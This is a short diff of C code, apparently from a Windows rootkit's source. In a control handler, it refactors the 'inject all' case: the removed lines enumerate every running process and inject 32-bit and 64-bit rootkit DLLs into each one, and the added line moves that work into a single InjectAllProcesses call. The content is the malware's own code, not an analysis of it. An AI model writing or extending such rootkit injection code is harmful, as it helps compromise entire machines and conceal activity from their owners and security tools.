@@ -198,20 +198,7 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 		}
 		case CONTROL_PROCESSES_INJECT_ALL:
 		{
-			LPDWORD processes = NEW_ARRAY(DWORD, 10000);
-			DWORD processCount = 0;
-			if (EnumProcesses(processes, sizeof(DWORD) * 10000, &processCount))
-			{
-				processCount /= sizeof(DWORD);
-
-				for (DWORD i = 0; i < processCount; i++)
-				{
-					InjectDll(processes[i], RootkitDll32, RootkitDll32Size);
-					InjectDll(processes[i], RootkitDll64, RootkitDll64Size);
-				}
-			}
-
-			FREE(processes);
+			InjectAllProcesses(RootkitDll32, RootkitDll32Size, RootkitDll64, RootkitDll64Size);
 			break;
 		}
 		case CONTROL_PROCESSES_DETACH:
